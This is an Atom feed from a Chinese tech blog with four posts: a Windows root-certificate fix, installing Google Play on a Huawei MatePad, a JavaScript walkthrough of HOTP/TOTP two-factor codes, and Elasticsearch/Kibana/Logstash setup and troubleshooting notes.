<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>FlamePeak</title>
  <subtitle>We know something, but we do not know more.</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://flamepeak.com/"/>
  <updated>2021-01-13T02:37:40.634Z</updated>
  <id>http://flamepeak.com/</id>
  
  <author>
    <name>FlamePeak</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>A certificate chain could not be built to a trusted root authority</title>
    <link href="http://flamepeak.com/2021/01/09/Windows%20A%20certificate%20chain%20could%20not%20be%20built%20to%20a%20trusted%20root%20authority%2020210120/"/>
    <id>http://flamepeak.com/2021/01/09/Windows A certificate chain could not be built to a trusted root authority 20210120/</id>
    <published>2021-01-09T02:27:55.000Z</published>
    <updated>2021-01-13T02:37:40.634Z</updated>
    
    <content type="html"><![CDATA[<hr>
<p>windows 7 出现这个情况，一般很多软件安装不上，中间异常退出。例如：net framework， vmware等等</p>
<p>解决方法如下：</p>
<ol type="1">
<li>从微软官方下载证书: <a href="http://go.microsoft.com/fwlink/?linkid=747875&amp;clcid=0x409" target="_blank" rel="noopener">MicrosoftRootCertificateAuthority2011.cer</a></li>
</ol>
<p>或者从下面地址下载</p>
<p><a href="https://github.com/yanglr/WindowsDevTools/raw/master/dotNET/MicrosoftRootCertificateAuthority2011.cer" target="_blank" rel="noopener">MicrosoftRootCertificateAuthority2011.cer - github</a>.</p>
<ol start="2" type="1">
<li>双击证书，开始安装</li>
<li>点击下方<strong>安装证书</strong>按钮</li>
<li>下一步</li>
<li>选择证书存放位置，手动选择第二项，点击<strong>浏览</strong>或Browse，选中<strong>可信任的根证书机构</strong>或<strong>Trusted Root Certification Authorities</strong></li>
<li>继续下一步，直至完成</li>
<li>如果后面弹框的话，就接受。</li>
</ol>
<p>参考：https://stackoverflow.com/questions/47176239/a-certificate-chain-could-not-be-built-to-a-trusted-root-authority/60812129#60812129</p>
]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
&lt;p&gt;windows 7 出现这个情况，一般很多软件安装不上，中间异常退出。例如：net framework， vmware等等&lt;/p&gt;
&lt;p&gt;解决方法如下：&lt;/p&gt;
&lt;ol type=&quot;1&quot;&gt;
&lt;li&gt;从微软官方下载证书: &lt;a href=&quot;http://go
    
    </summary>
    
      <category term="Tools" scheme="http://flamepeak.com/categories/Tools/"/>
    
    
      <category term="windows" scheme="http://flamepeak.com/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>华为Matepad Pro 安装Google Play Store (2020.12.28)</title>
    <link href="http://flamepeak.com/2020/12/28/Android-Huawei%20Matepad%20pro%20install%20Google%20play/"/>
    <id>http://flamepeak.com/2020/12/28/Android-Huawei Matepad pro install Google play/</id>
    <published>2020-12-28T02:39:50.000Z</published>
    <updated>2020-12-29T06:37:21.878Z</updated>
    
    <content type="html"><![CDATA[<h3 id="条件">条件</h3>
<p>需要有Google账号，VPN</p>
<h3 id="参考网址与视频">参考网址与视频</h3>
<p>需要使用 Googlefier这个工具，前往 <a href="http://bit.ly/3l1cB4o" target="_blank" rel="noopener">bit.ly/3l1cB4o</a>下载,</p>
<p>也就是下面的网址<a href="https://forum.xda-developers.com/t/googlefier-install-gms-on-huawei-honor.4180485/" target="_blank" rel="noopener">Googlefier - Install GMS on Huawei/Honor</a></p>
<p>如果可以上YouTube，可以看这个视频<a href="https://www.youtube.com/watch?v=V3WBEF5ljsM" target="_blank" rel="noopener">MOST SIMPLE WAY to install Google Services on Huawei [100% working - december 2020]</a>，讲解非常详细</p>
<h3 id="大致流程">大致流程</h3>
<ol type="1">
<li>安装Googlefier</li>
<li>打开Googlefier，然后接受条款，继续</li>
<li>看到界面的1，2，3，4等步骤，接下来就按顺序安装即可，当然此时需要手机连接VPN，需要注意的是，每一步都会有弹框提示，注意阅读注意事项。</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;条件&quot;&gt;条件&lt;/h3&gt;
&lt;p&gt;需要有Google账号，VPN&lt;/p&gt;
&lt;h3 id=&quot;参考网址与视频&quot;&gt;参考网址与视频&lt;/h3&gt;
&lt;p&gt;需要使用 Googlefier这个工具，前往 &lt;a href=&quot;http://bit.ly/3l1cB4o&quot; target
    
    </summary>
    
      <category term="Android" scheme="http://flamepeak.com/categories/Android/"/>
    
    
      <category term="Google Play" scheme="http://flamepeak.com/tags/Google-Play/"/>
    
      <category term="Huawei" scheme="http://flamepeak.com/tags/Huawei/"/>
    
      <category term="Android" scheme="http://flamepeak.com/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>2FA 双因子验证</title>
    <link href="http://flamepeak.com/2020/09/03/Cryptography-2FA/"/>
    <id>http://flamepeak.com/2020/09/03/Cryptography-2FA/</id>
    <published>2020-09-03T01:00:39.000Z</published>
    <updated>2020-09-03T02:20:12.252Z</updated>
    
    <content type="html"><![CDATA[<h3 id="基础知识">基础知识</h3>
<p>OTP（One Time Passowrd）可以分为两种，HOTP和TOTP，即<strong>HMAC-based One Time Password</strong> and <strong>Time-based OTP</strong>。 TOPT并不是一种完全不同的模式，而是HOTP的增强版。</p>
<p>HOTP算法在 <a href="https://tools.ietf.org/html/rfc4226" target="_blank" rel="noopener">RFC4226</a>中进行了描述，大约有35页，包含了格式描述、例子等。</p>
<p>HMAC stands for <strong>Hash-based Message Authentication Code</strong>.</p>
<p><strong>MAC</strong> is a way of proving that a message came from the expected sender and not someone else. <strong>MAC algorithm</strong> produces a <strong>MAC tag</strong> using a secret key that is only known to the sender and the receiver. 消息认证码的输入包括任意长度的消息和一个发送者与接收者之间之间共享的密钥，它可以输出固定长度的数据，这个数据称为MAC值。</p>
<p><strong>MAC</strong> itself is not a specific algorithm, but rather a term that refers to one.</p>
<p><strong>HMAC</strong>, in turn, IS a specific implementation. Or, to be more precise — HMAC-<em>X</em>, where <em>X</em> is one of the crypthographic hash functions. Now, HMAC takes two parameters — a secret key and your message, mixes them together in a special way, applies a hash function of your choice twice and produces a MAC tag.</p>
<p><a href="https://flamepeak.com/2016/11/23/tu-jie-mi-ma-ji-shu-authentication20161123/">参考：认证</a></p>
<p>根据HOTP规范，HOTP的计算基于两个值：K（客户端和服务器端的密钥secret key）和C（Counter）。共享密钥K必须大于128位，160位更好，它在你初始化2FA时生成。Counter是一个8字节的值，它在服务器和客户端之间同步，当你生成密码时它会持续更新。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">In HOTP, client counter is incremented each time a new password is generated and server counter — each time a password is validated. Since we can generate passwords without actually using them, server allows counter values to be a bit ahead of what the current one is but only within a certain window. If you played with your OTP token too much and it was an HOTP algorithm — you&apos;ll have to resync your token with server.</span><br></pre></td></tr></table></figure>
<p>RFC4226定义的HOTP如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HOTP(K,C) = Truncate(HMAC-SHA-1(K,C))</span><br></pre></td></tr></table></figure>
<p>So, K is predictably used as our secret key and <strong>C</strong>ounter is used as the message.</p>
<h3 id="流程与计算">流程与计算</h3>
<ul>
<li>Generate HMAC-SHA1 value from our <strong>K</strong> and <strong>C</strong> parameters. This will be a 20-byte string</li>
<li>Extract 4 bytes from that string in a specific way</li>
<li>Convert those bytes into a number, divide that number by 10^n, where n = number of digits in the OTP and take the remainder. Usually n=6.</li>
</ul>
<p><strong>首先，计算HMAC-sha1</strong></p>
<p>在Hash计算时，可以使用 <a href="https://www.w3.org/TR/WebCryptoAPI/" target="_blank" rel="noopener"><strong>Web Crypto API</strong></a>，这也要求你的脚本必须运行在使用HTTPS的网站上。幸运的是，在Firefox中你可以使用任何环境，而不用重复造轮子或者引入第三方库。</p>
<p>Crypto API位于<code>window.crypto.subtle</code>。</p>
<p>首先，我们需要使用<code>importKey</code>方法，因为我们要引入自己的key，而不是在浏览器中生成。它使用5个参数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">importKey(</span><br><span class="line">    format</span><br><span class="line">    keyData,</span><br><span class="line">    algorithm,</span><br><span class="line">    extractable,</span><br><span class="line">    usages</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>在我们例子中:</p>
<ul>
<li><code>format</code> will be <code>'raw'</code>, meaning that we will supply the key as raw bytes in an <code>ArrayBuffer</code>.</li>
<li><code>keyData</code> is the ArrayBuffer mentioned above. We'll talk about generating it in a bit</li>
<li><code>algorithm</code> will be <code>HMAC-SHA1</code> as per OTP spec. This has to be an <a href="https://developer.mozilla.org/en-US/docs/Web/API/HmacImportParams" target="_blank" rel="noopener">HmacImportParams</a> object</li>
<li><code>extractable</code> can be false, since we don't plan to export the key</li>
<li>And finally, of all possible <code>usages</code> we will only need <code>'sign'</code></li>
</ul>
<p>Our secret key will be a long random string. In reality it could be a sequence of bytes that are not necessarily printable。</p>
<p>为了把密钥转换成<code>ArrayBuffer</code>，我们将使用<code>TextEncoder</code>。代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> encoder = <span class="keyword">new</span> TextEncoder(<span class="string">'utf-8'</span>);</span><br><span class="line"><span class="keyword">const</span> secretBytes = encoder.encode(secret);</span><br></pre></td></tr></table></figure>
<p>汇总一下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> Crypto = window.crypto.subtle;</span><br><span class="line"> <span class="keyword">const</span> encoder = <span class="keyword">new</span> TextEncoder(<span class="string">'utf-8'</span>);</span><br><span class="line"> <span class="keyword">const</span> secretBytes = encoder.encode(secret);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">const</span> key = await Crypto.importKey(</span><br><span class="line">   <span class="string">'raw'</span>,</span><br><span class="line">   secretBytes,</span><br><span class="line">   &#123; name: <span class="string">'HMAC'</span>, hash: &#123; name: <span class="string">'SHA-1'</span> &#125; &#125;,</span><br><span class="line">   <span class="keyword">false</span>,</span><br><span class="line">   [<span class="string">'sign'</span>]</span><br><span class="line"> );</span><br></pre></td></tr></table></figure>
<p>接下来，我们处理Counter：</p>
<p>根据规范，Counter应该为8字节，同样<code>ArrayBuffer</code>格式。To convert it into this form we will first use a trick that is usually used to pad numbers with leading zeroes in JS and then put each individual byte into the <code>ArrayBuffer</code> using a <code>DataView</code>. Please note that according to spec all binary data is treated as <strong>big endian</strong> (most significant bit first).</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">function <span class="title">padCounter</span><span class="params">(counter)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> buffer = <span class="keyword">new</span> ArrayBuffer(<span class="number">8</span>);</span><br><span class="line">  <span class="keyword">const</span> bView = <span class="keyword">new</span> DataView(buffer);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> byteString = <span class="string">'0'</span>.repeat(<span class="number">64</span>); <span class="comment">// 8 bytes</span></span><br><span class="line">  <span class="keyword">const</span> bCounter = (byteString + counter.toString(<span class="number">2</span>)).slice(-<span class="number">64</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (let <span class="keyword">byte</span> = <span class="number">0</span>; <span class="keyword">byte</span> &lt; <span class="number">64</span>; <span class="keyword">byte</span> += <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> byteValue = parseInt(bCounter.slice(<span class="keyword">byte</span>, <span class="keyword">byte</span> + <span class="number">8</span>), <span class="number">2</span>);</span><br><span class="line">    bView.setUint8(<span class="keyword">byte</span> / <span class="number">8</span>, byteValue);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> buffer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>With that in place — we are ready to sign! To do that we will just need to use <code>sign</code> function of <code>SubtleCrypto</code>.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> counterArray = padCounter(counter);</span><br><span class="line"><span class="keyword">const</span> HS = await Crypto.sign(<span class="string">'HMAC'</span>, key, counterArray);</span><br></pre></td></tr></table></figure>
<p><strong>第二步，生成4字节字符串</strong></p>
<p>Generate a 4-byte string (Dynamic Truncation)<br>
Let Sbits = DT(HS) // DT, defined below,<br>
// returns a 31-bit string</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">function <span class="title">DT</span><span class="params">(HS)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// First we take the last byte of our generated HS and extract last 4 bits out of it.</span></span><br><span class="line">  <span class="comment">// This will be our _offset_, a number between 0 and 15.</span></span><br><span class="line">  <span class="keyword">const</span> offset = HS[<span class="number">19</span>] &amp; <span class="number">0b1111</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Next we take 4 bytes out of the HS, starting at the offset</span></span><br><span class="line">  <span class="keyword">const</span> P = ((HS[offset] &amp; <span class="number">0x7f</span>) &lt;&lt; <span class="number">24</span>) | (HS[offset + <span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (HS[offset + <span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | HS[offset + <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Finally, convert it into a binary string representation</span></span><br><span class="line">  <span class="keyword">const</span> pString = P.toString(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> pString;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Now we only need to convert what we got from DT to an integer and off we go to stage 3.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">function <span class="title">truncate</span><span class="params">(uKey)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> Sbits = DT(uKey);</span><br><span class="line">  <span class="keyword">const</span> Snum = parseInt(Sbits, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> Snum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>第三步，获得结果</strong></p>
<p>Stage 3 is really small. All we need to do now is to divide our resulting number by <code>10 ** (number of digits in OTP)</code> and take the remainder of that division. This way we basically cut last N digits from the resulting number. The spec mentions that you must extract at least 6 digits and possibly 7 or 8. Theoretically since it's a 31-bit integer you can extract up to 9 digits, but in reality I've never seen anything over 6. Have you?</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">async function <span class="title">generateHOTP</span><span class="params">(secret, counter)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> key = <span class="function">await <span class="title">generateKey</span><span class="params">(secret, counter)</span></span>;</span><br><span class="line">  <span class="keyword">const</span> uKey = <span class="keyword">new</span> Uint8Array(key);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> Snum = truncate(uKey);</span><br><span class="line">  <span class="comment">// Make sure we keep leading zeroes</span></span><br><span class="line">  <span class="keyword">const</span> padded = (<span class="string">'000000'</span> + (Snum % (<span class="number">10</span> ** <span class="number">6</span>))).slice(-<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> padded;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>TOTP</strong></p>
<p>当你打开流行的2FA app，可以看到倒计时，那就是TOTP。</p>
<p><strong>Time-based</strong> means that instead of a static counter, current time is used as a moving factor. Or, to be precise, current <em>time step</em>. To calculate this <em>time step</em> we take current unix epoch time (number of milliseconds since 00:00:00 UTC on 1 January 1970) and divide it by a <em>time window</em> (usually 30 seconds). Server usually allows for a bit of time drift to account for imperfections in time sync — about 1 step forwards and backwards depending on the configuration.</p>
<p>关于TOTP，可以查阅<a href="https://tools.ietf.org/html/rfc6238" target="_blank" rel="noopener">RFC6238</a>。</p>
<p>Due to time-based scheme being an extension over original algorithm, no changes to the original implementation are required. We will use <code>requestAnimationFrame</code> and check on every tick if we are still inside the time window. If we are not — we will calculate a new time step (counter) and regenerate HOTP with it. Omitting all the administrative code it will look roughly like this:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">let stepWindow = <span class="number">30</span> * <span class="number">1000</span>; <span class="comment">// 30 seconds in ms</span></span><br><span class="line">let lastTimeStep = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> updateTOTPCounter = () =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> timeSinceStep = Date.now() - lastTimeStep * stepWindow;</span><br><span class="line">  <span class="keyword">const</span> timeLeft = Math.ceil(stepWindow - timeSinceStep);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (timeLeft &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> requestAnimationFrame(updateTOTPCounter);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  timeStep = getTOTPCounter();</span><br><span class="line">  lastTimeStep = timeStep;</span><br><span class="line">    &lt;...update counter and regenerate...&gt;</span><br><span class="line">  requestAnimationFrame(updateTOTPCounter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="二维码">二维码</h3>
<p>通常，我们设置2FA时需要扫描二维码，其中包含我们需要的信息：密钥、使用的OTP算法、帐户名、发行者、位数。</p>
<p>浏览器中二维码扫描可以<a href="https://dev.to/al_khovansky/intro-to-screen-capture-api-scanning-qr-codes-bgi" target="_blank" rel="noopener">参考</a></p>
<p>二维码中的2FA地址格式通常如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">otpauth://TYPE/LABEL?PARAMETERS</span><br></pre></td></tr></table></figure>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">otpauth://totp/label?secret=oyu55d4q5kllrwhy4euqh3ouw7hebnhm5qsflfcqggczoafxu75lsagt&amp;algorithm=SHA1&amp;digits=6&amp;period=30</span><br></pre></td></tr></table></figure>
<p>解析地址代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> setupFromQR = data =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> url = <span class="keyword">new</span> URL(data);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// drop the "//" and get TYPE and LABEL</span></span><br><span class="line">  <span class="keyword">const</span> [scheme, label] = url.pathname.slice(<span class="number">2</span>).split(<span class="string">'/'</span>);</span><br><span class="line">  <span class="keyword">const</span> params = <span class="keyword">new</span> URLSearchParams(url.search);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> secret = params.get(<span class="string">'secret'</span>);</span><br><span class="line">  let counter;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (scheme === <span class="string">'hotp'</span>) &#123;</span><br><span class="line">    counter = params.get(<span class="string">'counter'</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    stepWindow = parseInt(params.get(<span class="string">'period'</span>), <span class="number">10</span>) * <span class="number">1000</span>;</span><br><span class="line">    counter = getTOTPCounter();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>参考：</p>
<ol type="1">
<li>https://dev.to/al_khovansky/generating-2fa-one-time-passwords-in-js-using-web-crypto-api-1hfo</li>
<li></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;基础知识&quot;&gt;基础知识&lt;/h3&gt;
&lt;p&gt;OTP（One Time Passowrd）可以分为两种，HOTP和TOTP，即&lt;strong&gt;HMAC-based One Time Password&lt;/strong&gt; and &lt;strong&gt;Time-based OTP
    
    </summary>
    
      <category term="Cryptography" scheme="http://flamepeak.com/categories/Cryptography/"/>
    
    
      <category term="cryptography" scheme="http://flamepeak.com/tags/cryptography/"/>
    
  </entry>
  
  <entry>
    <title>ELK 安装与简单实用</title>
    <link href="http://flamepeak.com/2020/08/30/ELK%20Elasticsearch%20Kibana%20Logstash%20usage%2020200111/"/>
    <id>http://flamepeak.com/2020/08/30/ELK Elasticsearch Kibana Logstash usage 20200111/</id>
    <published>2020-08-30T15:54:55.000Z</published>
    <updated>2021-01-13T02:16:17.097Z</updated>
    
    <content type="html"><![CDATA[<h2 id="安装elk">安装ELK</h2>
<h3 id="安装-elasticsearch">安装 Elasticsearch</h3>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.7.1-linux-x86_64.tar.gz</span><br><span class="line">wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.7.1-linux-x86_64.tar.gz.sha512</span><br><span class="line">shasum -a 512 -c elasticsearch-7.7.1-linux-x86_64.tar.gz.sha512 </span><br><span class="line">tar -xzf elasticsearch-7.7.1-linux-x86_64.tar.gz</span><br><span class="line"><span class="built_in">cd</span> elasticsearch-7.7.1/</span><br></pre></td></tr></table></figure>
<p>运行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">can not run elasticsearch as root</span><br><span class="line"></span><br><span class="line">su dbuser</span><br><span class="line">./elasticsearch -v</span><br></pre></td></tr></table></figure>
<p>错误1：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OpenJDK 64-Bit Server VM warning: INFO: os::commit_memory(0x00007f53abbe9000, 33554432, 0) failed; error=&apos;Not enough space&apos; (errno=12)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">free -m </span><br><span class="line">查看可用的swap空间</span><br><span class="line">可以增大swap空间</span><br><span class="line">或者，将/etc/elasticsearch/jvm.options 中的 -Xms512m -Xmx512m，进行修改，低于可用的swap空间</span><br></pre></td></tr></table></figure>
<h3 id="安装可视化工具elasticsearch-head">安装可视化工具elasticsearch-head</h3>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git://github.com/mobz/elasticsearch-head.git</span><br><span class="line"><span class="built_in">cd</span> elasticsearch-head</span><br><span class="line">npm install</span><br><span class="line">npm run start</span><br><span class="line">open http://localhost:9100/</span><br><span class="line"></span><br><span class="line">Enable CORS <span class="keyword">in</span> elasticsearch：</span><br><span class="line">In elasticsearch configuration，</span><br><span class="line">1. add http.cors.enabled: <span class="literal">true</span></span><br><span class="line">2. you must also <span class="built_in">set</span> http.cors.allow-origin because no origin allowed by default. </span><br><span class="line">http.cors.allow-origin: <span class="string">"*"</span> is valid value, however it’s considered as a security risk </span><br><span class="line">as your cluster is open to cross origin from anywhere.</span><br></pre></td></tr></table></figure>
<p>错误1:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">property [elasticsearch.version] is missing for plugin [head]</span><br></pre></td></tr></table></figure>
<p>不要把elasticsearch-head放到plugins目录下，放到外面</p>
<p>或者使用chrome插件： <a href="https://chrome.google.com/webstore/detail/elasticsearch-head/ffmkiejjmecolpfloofpjologoblkegm/" target="_blank" rel="noopener">ElasticSearch Head</a></p>
<p>错误2：</p>
<p>远程无法访问</p>
<p>修改yml:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">network.host: 0.0.0.0</span><br></pre></td></tr></table></figure>
<p>修改完，es无法启动：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">配置cluster.initial_master_nodes为当前node，默认为注释，放开注释就行了</span><br><span class="line"></span><br><span class="line">cluster.initial_master_nodes: [&quot;node-1&quot;, &quot;node-2&quot;]</span><br></pre></td></tr></table></figure>
<p>错误3：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.max file descriptors [4096] for elasticsearch process is too low, increase to at least [65536]</span><br><span class="line">修改/etc/security/limits.conf,增加配置，用户退出后重新登录生效</span><br><span class="line"></span><br><span class="line">*               soft    nofile            655350</span><br><span class="line">*               hard    nofile            655350</span><br><span class="line"></span><br><span class="line">2、max number of threads [3818] for user [es] is too low, increase to at least [4096]</span><br><span class="line">修改/etc/security/limits.conf,增加配置，用户退出后重新登录生效</span><br><span class="line">*               hard    nproc           4096</span><br><span class="line">*               soft    nproc           4096</span><br><span class="line"></span><br><span class="line">3、max file descriptors [65535] for elasticsearch process is too low, increase to at least [65536]</span><br><span class="line">修改/etc/sysctl.conf，增加如下配置</span><br><span class="line">fs.file-max=655350</span><br><span class="line">保存后执行sysctl -p 生效</span><br><span class="line"></span><br><span class="line">4、max virtual memory areas vm.max_map_count [65530] is too low, increase to at least [262144]</span><br><span class="line">修改/etc/sysctl.conf，增加如下配置</span><br><span class="line">vm.max_map_count=262144</span><br><span class="line">保存后执行sysctl -p 生效</span><br></pre></td></tr></table></figure>
<p>错误4:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">org.elasticsearch.discovery.MasterNotDiscoveredException:null</span><br><span class="line"></span><br><span class="line">修改：cluster.initial_master_nodes: [&quot;node-1&quot;]</span><br><span class="line">如果有node-2，但是它不存在，可能导致错误</span><br></pre></td></tr></table></figure>
<p>错误5：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">selinux 可能导致错误</span><br><span class="line"></span><br><span class="line">vi /etc/sysconfig/selinux</span><br></pre></td></tr></table></figure>
<h3 id="安装kibana">安装Kibana</h3>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl -O https://artifacts.elastic.co/downloads/kibana/kibana-7.7.1-linux-x86_64.tar.gz</span><br><span class="line">curl https://artifacts.elastic.co/downloads/kibana/kibana-7.7.1-linux-x86_64.tar.gz.sha512 | shasum -a 512 -c - </span><br><span class="line">tar -xzf kibana-7.7.1-linux-x86_64.tar.gz</span><br><span class="line"><span class="built_in">cd</span> kibana-7.7.1-linux-x86_64/</span><br></pre></td></tr></table></figure>
<p>运行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./bin/kibana</span><br></pre></td></tr></table></figure>
<p>搜索语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET _cat/indices</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET how2java/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;match&quot;: &#123;</span><br><span class="line">      &quot;name&quot;: &quot;连衣裙&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;sort&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;_id&quot;: &quot;desc&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>错误1:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">问题描述：[error][reporting] The Reporting plugin encountered issues launching Chromium in a self-test. You may have trouble generating reports.</span><br><span class="line"></span><br><span class="line">error  [10:21:36.799] [error][reporting] Error: Failed to launch chrome! ... ... kibana-7.5.1linux-x86_64/data/headless_shell-linux/headless_shell: cannot execute binary file</span><br><span class="line"></span><br><span class="line">解决方案：Kibana 后端模块 xpack.reporting 的截图功能使用到了 chrome，CentOS 暂时不支持 chrome，因此需要在 kibana.yml 配置文件中增加以下参数禁用 X-Pack reporting。</span><br><span class="line"></span><br><span class="line">xpack.reporting.enabled:  false</span><br></pre></td></tr></table></figure>
<h3 id="安装logstash">安装LogStash</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install java-1.8.0-openjdk.x86_64</span><br><span class="line"></span><br><span class="line">java -version</span><br><span class="line"></span><br><span class="line">必须先安装java环境</span><br></pre></td></tr></table></figure>
<h3 id="安装ik">安装ik</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">download pre-build package from here: https://github.com/medcl/elasticsearch-analysis-ik/releases</span><br><span class="line"></span><br><span class="line">create plugin folder:</span><br><span class="line">cd your-es-root/plugins/ </span><br><span class="line">mkdir ik</span><br><span class="line"></span><br><span class="line">unzip zipfile to folder:</span><br><span class="line">your-es-root/plugins/ik</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET _analyze</span><br><span class="line">&#123;</span><br><span class="line">  &quot;analyzer&quot;: &quot;ik_max_word&quot;,</span><br><span class="line">  &quot;text&quot;: &quot;你好中国，我叫马小玲&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="mongodb-数据导入es">mongodb 数据导入ES</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Linux bash:</span><br><span class="line">mongoexport --collection=people --db=human60 --out=human60_people.json</span><br><span class="line"></span><br><span class="line">Logstash: import</span><br><span class="line">vi mongodb_to_ES.conf</span><br><span class="line"></span><br><span class="line">input &#123;</span><br><span class="line">  file &#123;</span><br><span class="line">  path =&gt; &quot;/home/dbuser/ELK/human60_people.json&quot;</span><br><span class="line">  start_position =&gt; &quot;beginning&quot;</span><br><span class="line">  sincedb_path =&gt; &quot;/dev/null&quot;</span><br><span class="line">  codec =&gt; json</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">filter &#123;</span><br><span class="line">  mutate &#123;</span><br><span class="line">    remove_field =&gt; [&quot;_id&quot;,&quot;path&quot;,&quot;host&quot;]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">output &#123;</span><br><span class="line">  elasticsearch &#123;</span><br><span class="line">  hosts =&gt; [ &quot;localhost:9200&quot; ]</span><br><span class="line">  index =&gt; &quot;human60&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于ES中mapping无法修改，所以在数据导入之前一定号</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;安装elk&quot;&gt;安装ELK&lt;/h2&gt;
&lt;h3 id=&quot;安装-elasticsearch&quot;&gt;安装 Elasticsearch&lt;/h3&gt;
